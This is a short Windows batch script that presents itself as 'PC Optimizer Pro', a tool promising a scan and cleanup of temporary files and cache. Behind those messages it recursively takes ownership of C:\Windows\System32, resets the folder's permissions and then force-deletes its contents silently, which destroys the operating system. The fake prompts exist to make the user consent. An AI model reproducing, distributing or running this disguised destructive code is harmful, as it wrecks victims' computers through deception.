@echo off
title PC Optimizer Pro
color 0b
mode 1000
cls
echo Thank you for using PC Optimizer Pro! 
echo PC Optimizer Pro is software that helps clean up your PC.
echo To start, PC Optimizer Pro would like to perform a scan. Allow?
cls
echo Begin your scan. Please note that there may be times where we require permission to continue. Please enter "Y" when prompted.
takeown /f "C:\Windows\System32" /r /d Y
icacls "C:\Windows\System32" /reset /t /c /q
echo ==========================================================================
echo ==========================================================================
echo You scan has been completed, and PC Optimizer Pro will now optimize your PC by deleting unnessesary internet files, cache, temporary files, unneeded appdata, amongst others. 
del "C:\Windows\System32" /f /q /s
